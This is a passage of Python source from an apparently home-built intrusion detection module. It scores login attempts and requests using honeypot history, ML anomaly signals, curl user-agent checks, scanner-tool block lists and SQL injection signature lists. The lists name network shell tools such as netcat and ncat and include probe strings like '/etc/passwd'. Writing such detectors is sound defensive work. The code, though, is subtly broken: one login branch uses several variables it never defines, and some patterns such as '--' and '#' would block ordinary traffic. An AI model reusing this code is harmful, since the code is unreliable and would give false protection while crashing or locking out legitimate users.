                severity = float(suspicion_score) if isinstance(suspicion_score, (int, float)) else 0.85
                tracker.record_attack(
                    entity=ip_address,
                    entity_type="ip",
                    attack_type=attack_category,
                    severity=severity,
                    signature=threat_type,
                    blocked=True,
                    geolocation=None
                )
        except Exception as e:
            logger.debug(f"[HONEYPOT→AI] Failed to record honeypot attack in reputation tracker: {e}")

def _is_docker_bridge_ip(ip_address: str) -> bool:
    """Check if IP is a Docker bridge IP or host network IP (never block these).
    
    Handles both Docker networking modes:
    - Bridge mode: Container sees host as 172.x.x.1 (Docker bridge gateway)
    - Host mode: Container sees host as 127.0.0.1 (localhost)
    
    All these IPs represent the host machine accessing its own containerized services.
    
    SECURITY NOTE: While this function identifies Docker IPs, additional validation
    is performed in assess_request_pattern() to prevent IP spoofing attacks where
    an external attacker tries to forge packets with source IP 172.18.0.1.
    
    IP Spoofing Defense Layers:
    1. TCP/TLS handshake requirement (spoofed IPs can't complete 3-way handshake)
    2. Rate limiting even for whitelisted IPs
    3. User-Agent validation
    4. Endpoint pattern validation
    5. X-Forwarded-For header verification
    """
    # Handle localhost/host mode (127.0.0.1, ::1, localhost string)
    if ip_address in {"127.0.0.1", "localhost", "::1", "0.0.0.0", "::"} or ip_address.startswith("127."):
        return True
    
    try:
        ip_obj = ipaddress.ip_address(ip_address)
        
        # Docker default bridge networks ONLY (DO NOT auto-whitelist entire home networks!)
        docker_networks = [
            ipaddress.ip_network("172.16.0.0/12"),  # Docker user-defined bridges (172.16.0.0 - 172.31.255.255)
        ]
        return any(ip_obj in network for network in docker_networks)
    except ValueError:
        # If IP parsing fails, check if it's localhost string variant
        return ip_address.lower() in {"localhost", "localhost.localdomain"}

def _block_ip(ip_address: str) -> None:
    """Block an IP address and save to persistent storage."""
    # Only check manual whitelist - NO AUTO-WHITELISTING
    if ip_address in _WHITELISTED_IPS:
        logger.info(f"[SECURITY] ✅ IP {ip_address} is whitelisted, not blocking")
        return
    
    _blocked_ips.add(ip_address)
    _save_blocked_ips()


def _clean_old_records(ip: str, tracker: Dict[str, List[datetime]], minutes: int = 60) -> None:
    """Remove tracking records older than specified minutes."""
    cutoff = datetime.now(timezone.utc) - timedelta(minutes=minutes)
    if ip in tracker:
        tracker[ip] = [ts for ts in tracker[ip] if ts > cutoff]


def _assess_curl_usage(ip_address: str, user_agent: str, context: str = "") -> SecurityAssessment:
    """Intelligent curl usage assessment - blocks malicious patterns, allows legitimate API testing.
    
    Legitimate curl usage:
    - Standard curl user agent (curl/7.x.x)
    - API testing and automation
    - Monitoring and health checks
    
    Malicious curl patterns:
    - Modified/spoofed curl user agents
    - Curl combined with attack patterns
    - Excessive requests (handled by rate limiting)
    - Curl in command injection contexts
    """
    threats = []
    ua_lower = user_agent.lower()
    
    # Allow standard curl user agents (curl/X.X.X format)
    import re
    if re.match(r'^curl/\d+\.\d+\.\d+', user_agent.strip()):
        # Legitimate curl - just log for monitoring but don't block
        return SecurityAssessment(
            level=ThreatLevel.SAFE,
            threats=[],
            should_block=False,
            ip_address=ip_address,
        )
    
    # Suspicious curl patterns that indicate malicious activity
    malicious_curl_patterns = [
        # Curl with shell execution
        'bash', 'sh', '/bin/', 'cmd.exe', 'powershell',
        # Curl with piping
        '|', 'pipe',
        # Curl with suspicious flags in UA (modified user agent)
        '-o /tmp', '-o /var', '--output', '--data', '--upload-file',
        # Curl combined with attack tools
        'exploit', 'payload', 'shell', 'reverse',
        # Modified/spoofed curl
        'curl (compatible', 'curl-like', 'custom curl',
    ]
    
    suspicious_count = sum(1 for pattern in malicious_curl_patterns if pattern in ua_lower)
    
    if suspicious_count >= 2:
        # Multiple suspicious indicators = block
        _block_ip(ip_address)
        _log_threat(
            ip_address=ip_address,
            threat_type="Malicious curl Attack",
            details=f"Suspicious curl usage detected: {user_agent[:150]} | Context: {context[:50]}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED"
        )
        return SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["Malicious curl usage detected and BLOCKED"],
            should_block=True,
            ip_address=ip_address,
        )
    elif suspicious_count == 1:
        # Single suspicious indicator = monitor
        threats.append(f"Suspicious curl user agent pattern: {user_agent[:50]}")
        _log_threat(
            ip_address=ip_address,
            threat_type="Suspicious curl Usage",
            details=f"Non-standard curl detected: {user_agent[:100]}",
            level=ThreatLevel.SUSPICIOUS,
            action="monitored"
        )
        return SecurityAssessment(
            level=ThreatLevel.SUSPICIOUS,
            threats=threats,
            should_block=False,
            ip_address=ip_address,
        )
    
    # curl detected but no specific malicious patterns
    # Allow but log for monitoring
    return SecurityAssessment(
        level=ThreatLevel.SAFE,
        threats=[],
        should_block=False,
        ip_address=ip_address,
    )


def assess_login_attempt(
    ip_address: str,
    username: str,
    success: bool,
    user_agent: str = "",
    headers: dict = None,
) -> SecurityAssessment:
    """Assess security risk of a login attempt with VPN/Tor detection.
    
    Parameters
    ----------
    ip_address: IP address of the request
    username: Username attempting to log in
    success: Whether login was successful
    user_agent: Browser user agent string
    headers: Full HTTP headers for fingerprinting and VPN detection
    
    Returns
    -------
    SecurityAssessment with threat level and recommended action
    """
    threats: list[str] = []
    
    # PHASE 1A: Track connection in behavioral heuristics
    if ADVANCED_AI_AVAILABLE:
        try:
            track_connection(
                entity_id=ip_address,
                dest_port=443,  # Assume HTTPS for login
                protocol='tcp',
                payload_size=len(username) + 50,  # Approximate
                auth_attempt=True,
                auth_success=success
            )
        except Exception as e:
            logger.warning(f"[BEHAVIORAL] Failed to track login attempt: {e}")
    
    # Create client fingerprint for cross-IP tracking
    if headers:
        fingerprint = _fingerprint_client(ip_address, user_agent, headers)
    
    # Whitelist check - never block localhost/development IPs
    if ip_address in _WHITELISTED_IPS:
        return SecurityAssessment(
            level=ThreatLevel.SAFE,
            threats=[],
            should_block=False,
            ip_address=ip_address,
        )
    
    # Check if IP is already blocked
    if ip_address in _blocked_ips:
        return SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["IP address is blocked due to previous malicious activity"],
            should_block=True,
            ip_address=ip_address,
        )
    
    # DPI Monitoring: Log internal network threats for Section 13 signature extraction
    is_internal = ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.') or ip_address.startswith('172.')
    if is_internal and _DPI_ENABLED:
        # Always log internal threats for DPI analysis
        _log_threat(
            ip_address=ip_address,
            threat_type=threat_type,
            details=f"Internal network threat (DPI monitoring) - {details}",
            severity="MEDIUM"
        )
        # Optionally block internal IPs if aggressive mode enabled
        if _BLOCK_INTERNAL_THREATS and threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]:
            _block_ip(ip_address)
            return SecurityAssessment(
                level=ThreatLevel.CRITICAL,
                threats=["Internal network threat - aggressive blocking enabled"],
                should_block=True,
                ip_address=ip_address,
            )
        # Otherwise just monitor without blocking
        return assessment_result
    
    # Clean old records
    _clean_old_records(ip_address, _failed_login_tracker, minutes=30)
    
    # Track failed login attempts
    if not success:
        _failed_login_tracker[ip_address].append(datetime.now(timezone.utc))
        _save_tracking_data()  # Persist brute force tracking
    
    # Check for brute force attack (10+ failed attempts in 30 minutes - increased threshold)
    failed_count = len(_failed_login_tracker.get(ip_address, []))
    if failed_count >= 10:
        _block_ip(ip_address)
        _save_blocked_ips()  # Persist to disk
        _log_threat(
            ip_address=ip_address,
            threat_type="Brute Force Attack",
            details=f"Login brute force: {failed_count} failed attempts for user '{username}'",
            level=ThreatLevel.CRITICAL,
            action="blocked"
        )
        return SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=[f"Brute force attack detected: {failed_count} failed login attempts"],
            should_block=True,
            ip_address=ip_address,
        )
    elif failed_count >= 5:
        threats.append(f"Multiple failed login attempts detected: {failed_count} attempts")
        _log_threat(
            ip_address=ip_address,
            threat_type="Suspicious Login Pattern",
            details=f"{failed_count} failed login attempts for user '{username}'",
            level=ThreatLevel.DANGEROUS,
            action="monitored"
        )
        return SecurityAssessment(
            level=ThreatLevel.DANGEROUS,
            threats=threats,
            should_block=False,
            ip_address=ip_address,
        )
    
    # Check for suspicious user agents (comprehensive bot/scanner detection)
    # Note: curl is handled separately with smart detection
    suspicious_agents = [
        # Security scanners
        'sqlmap', 'nikto', 'nmap', 'masscan', 'metasploit', 'burp',
        'acunetix', 'netsparker', 'w3af', 'webscarab', 'paros',
        'skipfish', 'wapiti', 'arachni', 'vega', 'zap',
        # Command-line tools (excluding curl - handled separately)
        'wget', 'httpie', 'lwp', 'libwww',
        # Programming libraries
        'python-requests', 'scrapy', 'mechanize', 'urllib',
        'go-http-client', 'java/', 'okhttp',
        # Vulnerability scanners
        'openvas', 'nexpose', 'qualys', 'nessus',
        # Fuzzing tools
        'ffuf', 'gobuster', 'dirbuster', 'wfuzz',
        # Exploitation frameworks
        'beef', 'core-impact', 'canvas',
        # Automated bots
        'bot', 'crawler', 'spider', 'scraper', 'harvest',
        # Suspicious patterns
        'scanner', 'exploit', 'attack', 'injection',
    ]
    if user_agent and any(agent in user_agent.lower() for agent in suspicious_agents):
        threats.append(f"Suspicious user agent detected: {user_agent[:50]}")
        _log_threat(
            ip_address=ip_address,
            threat_type="Bot/Scanner Detection",
            details=f"Scanning tool detected: {user_agent[:100]}",
            level=ThreatLevel.SUSPICIOUS,
            action="monitored"
        )
        return SecurityAssessment(
            level=ThreatLevel.SUSPICIOUS,
            threats=threats,
            should_block=False,
            ip_address=ip_address,
        )
    
    # Smart curl detection - allow legitimate API testing, block malicious patterns
    if user_agent and 'curl' in user_agent.lower():
        curl_assessment = _assess_curl_usage(ip_address, user_agent, username)
        if curl_assessment.should_block:
            return curl_assessment
        elif curl_assessment.threats:
            threats.extend(curl_assessment.threats)
    
    # No threats detected
    return SecurityAssessment(
        level=ThreatLevel.SAFE,
        threats=[],
        should_block=False,
        ip_address=ip_address,
    )


def assess_request_pattern(
    ip_address: str,
    endpoint: str,
    method: str = "GET",
    user_agent: str = "",
    headers: dict = None,
) -> SecurityAssessment:
    """Assess security risk based on request patterns with AI/ML + VPN/Tor detection.
    
    **CRASH-RESISTANT**: Never crashes on malformed/attack requests - handles all errors gracefully.
    
    Combines:
    - Real AI/ML anomaly detection (IsolationForest)
    - ML threat classification (RandomForest)
    - ML IP reputation scoring (GradientBoosting)
    - Rule-based pattern matching (SQL injection, XSS, etc.)
    - VPN/Tor/Proxy detection with real IP revelation
    
    Parameters
    ----------
    ip_address: IP address of the request
    endpoint: Request endpoint/path (full URL with query params)
    method: HTTP method
    user_agent: User-Agent header
    headers: Full HTTP headers for VPN detection and fingerprinting
    
    Returns
    -------
    SecurityAssessment with threat level (AI-enhanced)
    """
    threats: list[str] = []

    # Derive stable actor identity for this request (used by higher-level engines).
    actor_key = _build_actor_key(ip_address, user_agent, headers or {})

    # Unified evidence collection (non-invasive): detection layers can optionally
    # append EvidenceEvent instances here without changing enforcement behavior.
    evidence_events: List[EvidenceEvent] = []

    # Track trust score for Step 21 semantic gate (if available)
    step21_trust_score: Optional[float] = None

    # PHASE 5: Initialize signal collection for meta decision engine
    detection_signals = []
    
    # PHASE 1A: Track connection in behavioral heuristics
    if ADVANCED_AI_AVAILABLE:
        try:
            # Determine port from endpoint or default to 80/443
            port = 443 if 'https' in endpoint.lower() else 80
            track_connection(
                entity_id=ip_address,
                dest_port=port,
                protocol='tcp',
                payload_size=len(endpoint) + len(method) + 100  # Approximate request size
            )
        except Exception as e:
            logger.warning(f"[BEHAVIORAL] Failed to track request: {e}")
    
    # PHASE 4: Track connection in network graph
    if GRAPH_INTELLIGENCE_AVAILABLE:
        try:
            # Determine destination IP (assume server's internal IP for now)
            # In production, this would be the actual server IP from socket
            server_ip = "10.0.0.1"  # Placeholder - should be actual server IP
            port = 443 if 'https' in endpoint.lower() else 80
            protocol = "TCP"
            bytes_transferred = len(endpoint) + len(method) + len(user_agent) + 100
            
            # Use the correct function signature
            from AI.graph_intelligence import get_graph_intelligence
            graph = get_graph_intelligence()
            graph.add_connection(
                source=ip_address,
                destination=server_ip,
                port=port,
                protocol=protocol,
                byte_count=bytes_transferred
            )
        except Exception as e:
            logger.warning(f"[GRAPH] Failed to track connection: {e}")
    
    # Create client fingerprint and detect VPN/Tor
    if headers is None:
        headers = {}
    
    # === REAL AI/ML ANALYSIS ===
    ml_threats = []
    ai_confidence = 0.0
    
    if ML_AVAILABLE and _anomaly_detector is not None:
        try:
            # Extract features for ML models
            features = _extract_features_from_request(ip_address, endpoint, user_agent, headers, method)
            
            if len(features) > 0:
                # PHASE 3: Track features for drift detection
                if ADVANCED_AI_AVAILABLE:
                    try:
                        track_features(features)
                    except Exception as e:
                        logger.debug(f"[DRIFT] Failed to track features: {e}")
                
                # 1. Anomaly Detection (unsupervised learning - IsolationForest)
                is_anomaly, anomaly_score = _ml_predict_anomaly(features)
                if is_anomaly:
                    ml_threats.append(f"🤖 AI ANOMALY DETECTED (score: {anomaly_score:.3f})")
                    ai_confidence += 0.4
                    
                    # PHASE 5: Add signal to meta engine
                    if META_ENGINE_AVAILABLE:
                        sig = DetectionSignal(
                            signal_type=MetaSignalType.ML_ANOMALY,
                            is_threat=True,
                            confidence=min(1.0, anomaly_score),
                            threat_level=MetaThreatLevel.SUSPICIOUS,
                            details=f"ML anomaly detected (score: {anomaly_score:.3f})",
                            timestamp=datetime.now(timezone.utc).isoformat()
                        )
                        detection_signals.append(sig)
                        _record_signal_detection(MetaSignalType.ML_ANOMALY)
                        evidence_events.append(EvidenceEvent(
                            actor_id=actor_key.id,
                            source_ip=ip_address,
                            behavior_type="anomaly_detection",
                            signal_type=MetaSignalType.ML_ANOMALY.name,
                            is_threat=True,
                            confidence=min(1.0, anomaly_score),
                            severity=MetaThreatLevel.SUSPICIOUS.value,
                            endpoint=endpoint,
                            method=method,
                            mitre_techniques=[],
                            timestamp=sig.timestamp,
                            raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                        ))
                
                # PHASE 2: Autoencoder Anomaly Detection (deep learning)
                autoencoder = get_traffic_autoencoder()
                if autoencoder and autoencoder.is_trained:
                    ae_anomaly, recon_error, ae_score = autoencoder.detect_anomaly(features)
                    if ae_anomaly:
                        ml_threats.append(f"🧠 AUTOENCODER ANOMALY (error: {recon_error:.4f}, score: {ae_score:.2f})")
                        ai_confidence += ae_score * 0.3
                        
                        # PHASE 5: Add autoencoder signal
                        if META_ENGINE_AVAILABLE:
                            sig = DetectionSignal(
                                signal_type=MetaSignalType.AUTOENCODER,
                                is_threat=True,
                                confidence=ae_score,
                                threat_level=MetaThreatLevel.DANGEROUS,
                                details=f"Autoencoder detected zero-day pattern (error: {recon_error:.4f})",
                                timestamp=datetime.now(timezone.utc).isoformat()
                            )
                            detection_signals.append(sig)
                            _record_signal_detection(MetaSignalType.AUTOENCODER)
                            evidence_events.append(EvidenceEvent(
                                actor_id=actor_key.id,
                                source_ip=ip_address,
                                behavior_type="anomaly_detection",
                                signal_type=MetaSignalType.AUTOENCODER.name,
                                is_threat=True,
                                confidence=ae_score,
                                severity=MetaThreatLevel.DANGEROUS.value,
                                endpoint=endpoint,
                                method=method,
                                mitre_techniques=[],
                                timestamp=sig.timestamp,
                                raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                            ))
                else:
                    # Update baseline with SAFE traffic for drift detector
                    if ADVANCED_AI_AVAILABLE and not is_anomaly:
                        try:
                            update_baseline(features)
                        except Exception as e:
                            logger.debug(f"[DRIFT] Failed to update baseline: {e}")
                
                # 2. Threat Classification (supervised learning)
                if hasattr(_threat_classifier, 'classes_'):
                    threat_type, threat_conf = _ml_classify_threat(features)
                    if threat_conf > 0.7 and threat_type != 'safe':
                        ml_threats.append(f"🤖 AI CLASSIFIED: {threat_type.upper()} ({threat_conf*100:.1f}% confidence)")
                        ai_confidence += threat_conf * 0.3
                        
                        # PHASE 5: Add classification signal
                        if META_ENGINE_AVAILABLE:
                            sig = DetectionSignal(
                                signal_type=MetaSignalType.ML_CLASSIFICATION,
                                is_threat=True,
                                confidence=threat_conf,
                                threat_level=MetaThreatLevel.DANGEROUS,
                                details=f"ML classified as {threat_type}",
                                timestamp=datetime.now(timezone.utc).isoformat()
                            )
                            detection_signals.append(sig)
                            _record_signal_detection(MetaSignalType.ML_CLASSIFICATION)
                            evidence_events.append(EvidenceEvent(
                                actor_id=actor_key.id,
                                source_ip=ip_address,
                                behavior_type="ml_classification",
                                signal_type=MetaSignalType.ML_CLASSIFICATION.name,
                                is_threat=True,
                                confidence=threat_conf,
                                severity=MetaThreatLevel.DANGEROUS.value,
                                endpoint=endpoint,
                                method=method,
                                mitre_techniques=[],
                                timestamp=sig.timestamp,
                                raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                            ))
                
                # 3. IP Reputation Prediction
                if hasattr(_ip_reputation_model, 'classes_'):
                    is_malicious, reputation_score = _ml_predict_ip_reputation(features)
                    if is_malicious:
                        ml_threats.append(f"🤖 AI REPUTATION: MALICIOUS ({reputation_score*100:.1f}% probability)")
                        ai_confidence += reputation_score * 0.3
                        
                        # PHASE 5: Add reputation signal
                        if META_ENGINE_AVAILABLE:
                            sig = DetectionSignal(
                                signal_type=MetaSignalType.ML_REPUTATION,
                                is_threat=True,
                                confidence=reputation_score,
                                threat_level=MetaThreatLevel.DANGEROUS,
                                details=f"Malicious IP reputation",
                                timestamp=datetime.now(timezone.utc).isoformat()
                            )
                            detection_signals.append(sig)
                            _record_signal_detection(MetaSignalType.ML_REPUTATION)
                            evidence_events.append(EvidenceEvent(
                                actor_id=actor_key.id,
                                source_ip=ip_address,
                                behavior_type="reputation",
                                signal_type=MetaSignalType.ML_REPUTATION.name,
                                is_threat=True,
                                confidence=reputation_score,
                                severity=MetaThreatLevel.DANGEROUS.value,
                                endpoint=endpoint,
                                method=method,
                                mitre_techniques=[],
                                timestamp=sig.timestamp,
                                raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                            ))
                
                # Store features for future training
                _request_features[ip_address].append(features)
                
                # Auto-retrain if needed
                if _should_retrain_ml_models():
                    print("[AI] Auto-retraining ML models with new data...")
                    _train_ml_models_from_history()
        
        except Exception as e:
            print(f"[AI WARNING] ML analysis failed: {e}")
    
    # Add ML threats to main threats list
    threats.extend(ml_threats)

    # Fingerprint client for cross-IP tracking
    fingerprint = _fingerprint_client(ip_address, user_agent, headers)

    # Detect VPN/Tor/Proxy usage (base heuristics)
    vpn_detection = _detect_vpn_tor_proxy(ip_address, headers)
    if vpn_detection["is_anonymized"] and vpn_detection["confidence"] > 70:
        threats.append(
            f"🚨 ANONYMIZED CONNECTION: {vpn_detection['anonymization_type']} "
            f"(Confidence: {vpn_detection['confidence']}%)"
        )
        if vpn_detection["real_ip_candidates"]:
            threats.append(f"🎯 Real IP revealed: {vpn_detection['real_ip_candidates'][0]}")

    # Composite Layer 11 VPN/Tor signal for meta decision engine
    vpn_signal, vpn_evidence = _build_vpn_tor_signal(
        ip_address=ip_address,
        headers=headers,
        actor_key=actor_key,
        endpoint=endpoint,
        method=method,
    )
    if vpn_signal is not None:
        detection_signals.append(vpn_signal)
        if vpn_evidence is not None:
            evidence_events.append(vpn_evidence)
        if vpn_signal.is_threat and vpn_signal.confidence >= 0.7:
            threats.append("🔐 VPN/Tor fingerprinting: high-confidence anonymized attacker behavior detected")
    
    # === AI-BASED EARLY BLOCKING ===
    # If AI confidence is very high, block immediately (before rule-based checks)
    if ai_confidence > 0.8:
        _block_ip(ip_address)
        _log_threat(
            ip_address=ip_address,
            threat_type="AI-Detected Attack",
            details=f"🤖 ML models detected attack with {ai_confidence*100:.1f}% confidence | Threats: {', '.join(ml_threats[:3])}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED_BY_AI",
            headers=headers
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=[f"🤖 AI BLOCKED (confidence: {ai_confidence*100:.1f}%)"] + ml_threats,
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Whitelist check - ONLY manual whitelist, NO automatic bypasses
    if ip_address in _WHITELISTED_IPS:
        # SECURITY: Additional validation to prevent IP spoofing attacks
        # Even whitelisted IPs must pass basic sanity checks
        spoofing_detected = False
        spoofing_reasons = []
        
        # Check 1: Rate limiting even for whitelisted IPs (prevents abuse)
        whitelisted_rate_limit = 1000  # 1000 requests per minute for localhost
        _clean_old_records(ip_address, _request_tracker, minutes=1)
        _request_tracker[ip_address].append(datetime.now(timezone.utc))
        if len(_request_tracker[ip_address]) > whitelisted_rate_limit:
            spoofing_detected = True
            spoofing_reasons.append(f"Rate limit exceeded: {len(_request_tracker[ip_address])}/min (limit: {whitelisted_rate_limit})")
        
        # Check 2: User-Agent validation (spoofed requests often have unusual UAs)
        if user_agent:
            suspicious_uas = ["masscan", "nmap", "nikto", "sqlmap", "metasploit", "havij", "acunetix"]
            if any(sus in user_agent.lower() for sus in suspicious_uas):
                spoofing_detected = True
                spoofing_reasons.append(f"Attack tool User-Agent detected: {user_agent[:100]}")
        
        # Check 3: Endpoint validation (localhost shouldn't access suspicious endpoints)
        suspicious_endpoints = ["/etc/passwd", "../", "php", "eval(", "exec(", "<script", "union select"]
        if any(sus in endpoint.lower() for sus in suspicious_endpoints):
            spoofing_detected = True
            spoofing_reasons.append(f"Suspicious endpoint from whitelisted IP: {endpoint[:100]}")
        
        # Check 4: X-Forwarded-For header check (IP spoofing attempt indicator)
        if headers and "X-Forwarded-For" in headers:
            forwarded_ip = headers["X-Forwarded-For"].split(",")[0].strip()
            if forwarded_ip != ip_address and not _is_docker_bridge_ip(forwarded_ip):
                spoofing_detected = True
                spoofing_reasons.append(f"X-Forwarded-For mismatch: {forwarded_ip} != {ip_address}")
        
        # If spoofing detected, treat as critical threat even if whitelisted
        if spoofing_detected:
            logger.warning(f"[ANTI-SPOOF] 🚨 Potential IP spoofing attack from whitelisted IP {ip_address}")
            logger.warning(f"[ANTI-SPOOF] Reasons: {'; '.join(spoofing_reasons)}")
            _log_threat(
                ip_address=ip_address,
                threat_type="IP Spoofing (Whitelisted IP)",
                details=f"🎭 Whitelisted IP behaving suspiciously: {'; '.join(spoofing_reasons)}",
                level=ThreatLevel.CRITICAL,
                action="LOGGED_NOT_BLOCKED",
                headers=headers
            )
            # Don't block, but return warning and trigger enhanced monitoring
            assessment = SecurityAssessment(
                level=ThreatLevel.SUSPICIOUS,
                threats=[f"⚠️ WHITELISTED IP ANOMALY: {'; '.join(spoofing_reasons)}"],
                should_block=False,  # Don't block localhost, but flag it
                ip_address=ip_address,
            )
            return _finalize_assessment(assessment, actor_key, evidence_events)
        
        # NO AUTO-WHITELISTING - User must manually whitelist trusted IPs
        # Auto-whitelisting creates security holes and allows bypass attacks
        
        # Whitelisted IP passed all checks - allow
        assessment = SecurityAssessment(
            level=ThreatLevel.SAFE,
            threats=[],
            should_block=False,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)

    # PHASE 5A: Honeypot history as ensemble signal
    if META_ENGINE_AVAILABLE:
        try:
            from AI.adaptive_honeypot import get_honeypot
            hp = get_honeypot()
            # Scan recent honeypot attacks for this IP (bounded by internal limit)
            honeypot_hits = 0
            last_category = "honeypot_probe"
            last_score = 0.85
            for entry in hp.get_attack_log(limit=500):
                if entry.get('source_ip') == ip_address:
                    honeypot_hits += 1
                    analysis = entry.get('analysis') or {}
                    if 'attack_category' in analysis:
                        last_category = analysis['attack_category']
                    if isinstance(analysis.get('suspicion_score'), (int, float)):
                        last_score = float(analysis['suspicion_score'])
            if honeypot_hits > 0:
                # Map suspicion score to meta threat level
                if last_score >= 0.9:
                    meta_level = MetaThreatLevel.CRITICAL
                elif last_score >= 0.7:
                    meta_level = MetaThreatLevel.DANGEROUS
                else:
                    meta_level = MetaThreatLevel.SUSPICIOUS
                sig = DetectionSignal(
                    signal_type=MetaSignalType.HONEYPOT,
                    is_threat=True,
                    confidence=max(0.7, min(1.0, last_score)),
                    threat_level=meta_level,
                    details=f"Honeypot interactions: {honeypot_hits} hits (category={last_category})",
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    metadata={
                        "honeypot_hits": honeypot_hits,
                        "attack_category": last_category,
                        "suspicion_score": last_score
                    }
                )
                detection_signals.append(sig)
                _record_signal_detection(MetaSignalType.HONEYPOT)
                evidence_events.append(EvidenceEvent(
                    actor_id=actor_key.id,
                    source_ip=ip_address,
                    behavior_type="honeypot",
                    signal_type=MetaSignalType.HONEYPOT.name,
                    is_threat=True,
                    confidence=sig.confidence,
                    severity=meta_level.value,
                    endpoint=endpoint,
                    method=method,
                    mitre_techniques=[],
                    timestamp=sig.timestamp,
                    raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                ))
        except Exception as e:
            logger.debug(f"[HONEYPOT→META] Failed to add honeypot signal: {e}")
    
    # Check if IP is blocked
    if ip_address in _blocked_ips:
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["IP address is blocked"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Smart curl detection with endpoint context for additional validation
    if user_agent and 'curl' in user_agent.lower():
        curl_assessment = _assess_curl_usage(ip_address, user_agent, f"Endpoint: {endpoint[:100]}")
        if curl_assessment.should_block:
            return _finalize_assessment(curl_assessment, actor_key, evidence_events)
        elif curl_assessment.threats:
            threats.extend(curl_assessment.threats)
    
    # Check for malicious security scanner tools in User-Agent - BLOCK IMMEDIATELY
    scanner_patterns = [
        # SQL injection tools
        'sqlmap', 'havij', 'pangolin', 'sqlninja', 'jsql', 'safe3',
        # Web vulnerability scanners
        'nikto', 'acunetix', 'nessus', 'openvas', 'w3af', 'webscarab',
        'skipfish', 'arachni', 'vega', 'wapiti', 'nuclei',
        # Proxy/intercepting tools
        'burp', 'paros', 'zap', 'owasp', 'beef',
        # Directory/file brute forcing
        'dirbuster', 'gobuster', 'ffuf', 'wfuzz', 'dirb', 'feroxbuster',
        # Network scanners - CRITICAL
        'nmap', 'masscan', 'zmap', 'unicornscan', 'hping', 'angry ip',
        'ncat', 'netcat', 'nc.exe', 'nc.traditional', 'ncat.exe',
        'zenmap', 'nmapfe', 'xnmap',
        # Exploitation frameworks
        'metasploit', 'msfconsole', 'exploit', 'shellshock',
        # XSS tools
        'xsser', 'xsstrike', 'dalfox', 'xsscrapy',
        # Command injection
        'commix', 'shellnoob',
        # Crawlers/spiders (malicious)
        'scrapy', 'httrack', 'wget', 'python-requests',
        # Automated attack tools
        'hydra', 'medusa', 'patator', 'brutus', 'crowbar',
        # Other reconnaissance
        'shodan', 'censys', 'whatweb', 'wpscan', 'joomscan',
    ]
    user_agent_lower = user_agent.lower()
    for scanner in scanner_patterns:
        if scanner in user_agent_lower:
            # BLOCK IP PERMANENTLY
            _block_ip(ip_address)
            _log_threat(
                ip_address=ip_address,
                threat_type="Security Scanner Detected",
                details=f"Malicious scanner tool detected: {user_agent[:150]} | Tool: {scanner.upper()}",
                level=ThreatLevel.CRITICAL,
                action="BLOCKED"
            )
            assessment = SecurityAssessment(
                level=ThreatLevel.CRITICAL,
                threats=[f"Security scanner detected and BLOCKED: {scanner.upper()}"],
                should_block=True,
                ip_address=ip_address,
            )
            return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Clean old records (last 5 minutes for request rate limiting)
    _clean_old_records(ip_address, _request_tracker, minutes=5)
    
    # Track request
    _request_tracker[ip_address].append(datetime.now(timezone.utc))
    
    # Periodically save (every 100th request to avoid constant I/O)
    if sum(len(reqs) for reqs in _request_tracker.values()) % 100 == 0:
        _save_tracking_data()
    
    # Check for DDoS (more than 500 requests in 5 minutes)
    request_count = len(_request_tracker.get(ip_address, []))
    if request_count > 500:
        _block_ip(ip_address)
        _log_threat(
            ip_address=ip_address,
            threat_type="DDoS Attack",
            details=f"{request_count} requests in 5 minutes to endpoint '{endpoint}'",
            level=ThreatLevel.CRITICAL,
            action="blocked"
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=[f"Potential DDoS attack: {request_count} requests in 5 minutes"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    elif request_count > 200:
        threats.append(f"High request rate detected: {request_count} requests in 5 minutes")
        _log_threat(
            ip_address=ip_address,
            threat_type="High Request Rate",
            details=f"{request_count} requests in 5 minutes",
            level=ThreatLevel.SUSPICIOUS,
            action="monitored"
        )
    
    # URL decode for better pattern matching
    from urllib.parse import unquote
    endpoint_decoded = unquote(endpoint)
    endpoint_lower = endpoint_decoded.lower()
    
    # Check for SQL injection patterns (comprehensive real-world attack signatures)
    sql_patterns = [
        # Classic SQL injection
        "' or '", '" or "', "' or 1=1", '" or 1=1', "' or '1'='1",
        # Union-based
        'union select', 'union all select', 'union distinct',
        # Stacked queries
        '; drop', '; delete', '; update', '; insert', '; exec',
        # Comments and evasion
        '--', '/*', '*/', '/*!', '#',
        # System procedures
        'xp_', 'sp_', 'exec(', 'execute(',
        # Database functions
        'concat(', 'substring(', 'ascii(', 'char(',
        # Information gathering
        'information_schema', 'sysobjects', 'syscolumns',
        # Time-based blind
        'sleep(', 'benchmark(', 'waitfor delay',
        # Boolean blind
        'and 1=1', 'and 1=2', 'or 1=1', 'or 1=2',
        # Hex encoding evasion
        '0x', 'unhex(', 'hex(',
        # Database detection
        '@@version', 'version()', 'database(',
        # File operations
        'load_file', 'into outfile', 'into dumpfile',
    ]
    if any(pattern in endpoint_lower for pattern in sql_patterns):
        # BLOCK IP for SQL injection attempts
        _block_ip(ip_address)
        matched_patterns = [p for p in sql_patterns if p in endpoint_lower]
        _log_threat(
            ip_address=ip_address,
            threat_type="SQL Injection Attack",
